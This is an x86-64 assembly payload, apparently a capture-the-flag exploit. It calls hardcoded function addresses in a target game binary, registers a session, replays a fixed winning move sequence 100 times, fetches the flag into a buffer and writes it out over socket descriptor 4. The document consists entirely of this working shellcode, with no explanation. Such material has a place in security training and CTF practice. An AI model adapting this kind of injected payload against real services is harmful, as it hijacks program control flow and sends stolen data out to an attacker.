
SEND_REQ_USER_FUNC_ADDR equ 0x402835 
SEND_STATE_FUNC_ADDR    equ 0x402a74
SEND_GET_FLAG_FUNC_ADDR equ 0x402ce1

SERVER_IP_ADDR          equ 0x405728
SESSION_ADDR            equ 0x405740

FLAG_BUF_ADDR           equ 0x405870 ; &name + 256
FLAG_LEN                equ 0x102

CMOVE1                  equ 0 
CMOVE2                  equ 3
CMOVE3                  equ 2
HMOVE1                  equ 1
HMOVE2                  equ 4
HMOVE3                  equ 7

NWINS                   equ 100

PSOCK                   equ 4

SYS_WRITE               equ 1


section .text
    global _start

_start:
_register_user:
    mov rdi, qword [SERVER_IP_ADDR]
    mov rsi, SESSION_ADDR
    mov rax, SEND_REQ_USER_FUNC_ADDR 
    call rax


_start_game:
   xor rbx, rbx ; store act number of wins in rbx


_win_game:
    ; cmove: 0 hmove: 1
    mov rdi, qword [SERVER_IP_ADDR]
    mov rsi, SESSION_ADDR
    mov rdx, CMOVE1
    mov rcx, HMOVE1
    mov rax, SEND_STATE_FUNC_ADDR
    call rax

    ; cmove: 3 hmove: 4
    mov rdi, qword [SERVER_IP_ADDR]
    mov rsi, SESSION_ADDR
    mov rdx, CMOVE2
    mov rcx, HMOVE2
    mov rax, SEND_STATE_FUNC_ADDR
    call rax

    ; cmove: 2 hmove: 7
    mov rdi, qword [SERVER_IP_ADDR]
    mov rsi, SESSION_ADDR
    mov rdx, CMOVE3
    mov rcx, HMOVE3
    mov rax, SEND_STATE_FUNC_ADDR
    call rax

    inc rbx
    cmp rbx, NWINS
    jne _win_game


_get_flag:
    mov rdi, qword [SERVER_IP_ADDR]
    mov rsi, SESSION_ADDR
    mov rdx, FLAG_BUF_ADDR
    mov rax, SEND_GET_FLAG_FUNC_ADDR
    call rax


_send_flag:
    mov rdi, PSOCK
    mov rsi, FLAG_BUF_ADDR
    mov rdx, FLAG_LEN
    mov rax, SYS_WRITE
    syscall